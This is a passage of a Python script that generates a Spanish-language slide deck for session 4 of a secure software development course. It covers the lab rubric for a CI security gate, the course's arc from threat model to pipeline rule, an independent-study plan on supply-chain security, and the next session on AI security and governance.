    p("La fila resaltada es la que más vale: cerrar el círculo de las cuatro sesiones. La amenaza que modelaron en el Lab 1, verificaron con ASVS en el Lab 2, hoy la convierten en una regla que bloquea.", 28),
    "El laboratorio es el mismo flujo que acaban de ver en el sandbox, pero en SU repo. El paso 5 es el entregable de verdad: la trazabilidad amenaza → regla. Rúbrica completa en labs/LAB3.md.", gap=24)
mark("s7")

save("entregable", kicker("9:30 · ENTREGABLE 1 DEL PROYECTO · VENCE HOY") + h2("Secciones 1 a 3, integradas") + cards([
    ("Code", "Sección 1–2 · Modelo", "El modelo de amenazas del Lab 1, mejorado con la revisión cruzada de la sesión 3."),
    ("Check", "Sección 3 · Verificación", "La tabla ASVS 5.0 del Lab 2: requisito, estado, evidencia (archivo:línea o prueba)."),
    ("Database", "En el repo del equipo", "Todo versionado. El Entregable 1 vive en el repositorio, no en un documento suelto."),
], dark=True) + p("Hoy el proyecto deja de ser documentos y empieza a ser el repositorio con su pipeline. El Entregable 2 (sesión 5) añade la capa de IA y gobernanza.", 30, dark=True),
    "Recordar que el Entregable 1 junta lo de las sesiones 2 y 3. No es trabajo nuevo: es consolidar e integrar en el repo lo que ya hicieron. Entregas tardías de los labs: hasta el viernes 20, 11 p. m. (ya extendido en Moodle).", dark=True, gap=32)

save("rubrica", kicker("CÓMO SE CALIFICA EL LAB 3") + h2("Rúbrica del laboratorio 3") + table(
    ["Criterio", "Peso", "Sobresaliente"],
    [["Gate instalado y corriendo", "25 %", "auditgate init aplicado; el Security Gate aparece como check requerido en un PR real"],
     ["PR que bloquea y se corrige", "30 %", "Un PR introduce una falla, el gate la bloquea, y un commit posterior lo pasa a verde"],
     ["Regla codificada con prueba", "30 %", "Una regla (propia o adaptada) con fixture; el test falla sin el control y pasa con él"],
     ["Trazabilidad y reflexión", "15 %", "La regla se liga a una amenaza del Lab 1; explica qué vio el gate y qué vio el triage"]],
    [26, 12, 62], size=25) +
    p("Un falso positivo bien justificado vale lo mismo que un verdadero positivo. La regla no tiene que ser perfecta: tiene que tener prueba.", 28),
    "Recalcar: el peso está en el PR que bloquea (30%) y la regla con prueba (30%). Lo demás es montaje. La rúbrica completa está en labs/LAB3.md.", gap=28)

# ================================================================ S8 Cierre
section("s8", "Cierre: el arco completo de las cinco sesiones y la sesión 5")
save("trazabilidad", kicker("9:50 · CIERRE", True) + h2("De la amenaza al gate que la bloquea", True) +
     f'''<div style="display:flex;gap:14px;align-items:center">{"<x-shape kind=\"arrow-right\" style=\"background:#E8893A;width:56px;height:30px\"></x-shape>".join(
         f'<div style="flex:1;background:{CARD_D};border-radius:16px;padding:28px;display:flex;flex-direction:column;gap:12px"><p style="{MONO};font-size:22px;color:{ORANGE}">{a}</p><p style="font-size:25px;color:{PAPER};line-height:1.35">{b}</p></div>'
         for a, b in [("S2 · AMENAZA", "token-ana nunca expira (STRIDE)"),
                      ("S3 · PRUEBA", "test + ASVS V9: así se verifica"),
                      ("S4 · GATE", "la regla bloquea el PR que la reintroduzca"),
                      ("SIEMPRE", "en cada cambio, sin depender de nadie")])}</div>''' +
     p("Cuatro sesiones, un solo hilo: <b>qué puede salir mal</b> (S2) → <b>cómo se verifica</b> (S3) → <b>cómo se vuelve automático</b> (S4). La seguridad dejó de ser un evento y se volvió una propiedad del pipeline.", 32, dark=True),
     "Cerrar el arco completo del curso. La amenaza que abrimos en la sesión 2 hoy tiene un gate que la bloquea en cada PR. Eso es desarrollo seguro: no heroísmo puntual, sino un sistema que no deja pasar el error.", dark=True, gap=40)
mark("s8")

save("estudio", kicker("ESTUDIO INDEPENDIENTE · ANTES DEL SÁBADO 21") + h2("De la plataforma a la gobernanza") + table(
    ["Actividad", "Horas"],
    [["Terminar el Lab 3: gate instalado, PR que bloquea y una regla con prueba", "3"],
     ["SLSA · niveles de provenance y qué garantiza cada uno", "1"],
     ["Sigstore / cosign keyless y SBOM (CycloneDX o SPDX)", "1"],
     ["OpenSSF Scorecard y las prácticas de un repo endurecido", "1"],
     ["<b>Integrar el Entregable 1 en el repo del equipo</b>", "2"],
     ["Leer sobre riesgos de IA: OWASP Top 10 for LLM, prompt injection", "1"]],
    [82, 18], size=26, hl=(4,)) + p("Guía completa y autoevaluación: estudio/SESION_04.md", 26),
    "La fila resaltada prepara el Entregable 1. La última fila es el puente a la sesión 5: mañana hablamos de asegurar sistemas de IA, justo lo que usamos hoy para el triage.", gap=28)

save("proxima", kicker("PRÓXIMA SESIÓN · SÁBADO 21 NOV · PRESENCIAL", True) +
     '<div style="display:flex;flex-direction:column;gap:28px">' + h2("IA segura, gobernanza y sustentación", True, 80) +
     p("Asegurar los sistemas de IA que hoy usamos para encontrar y priorizar: prompt injection, OWASP Top 10 for LLM, los guardarraíles del agente, gobernanza y la sustentación final del proyecto integrador.", 36, dark=True) + '</div>' +
     cards([("Check", "Traer", "El Lab 3 con el gate corriendo, el Entregable 1 en el repo, y la laptop con el proyecto listo para sustentar."),
            ("Code", "Sustentación", "Cada equipo presenta: amenaza → verificación → gate. El arco completo que cerramos hoy, en vivo.")], dark=True) +
     p("Dudas: jawy.romero@gmail.com", 26, dark=True).replace(SANS, MONO),
     "La sesión 5 cierra el curso: aseguramos la propia IA y cada equipo sustenta el recorrido completo. El triage de IA que vieron hoy es, a la vez, herramienta y objeto de estudio mañana.", dark=True, pad="128px", extra=";justify-content:space-between", fade=True)

deck = {"v": 4, "createdOnFiles": {"v": 1, "at": "2026-11-20T22:00:00Z"}, "lists": "css", "title": "Desarrollo Seguro UCP – Sesión 4",
        "order": ORDER, "sections": SECTIONS,
        "faces": {"ibm-plex-sans": {"family": "IBM Plex Sans", "href": "https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600;700&family=JetBrains+Mono:wght@400;600&display=swap"},
                  "jetbrains-mono": {"family": "JetBrains Mono", "href": "https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap"}}}
(HERE / "deck.json").write_text(json.dumps(deck, ensure_ascii=False), encoding="utf-8")
print(len(ORDER), "slides")
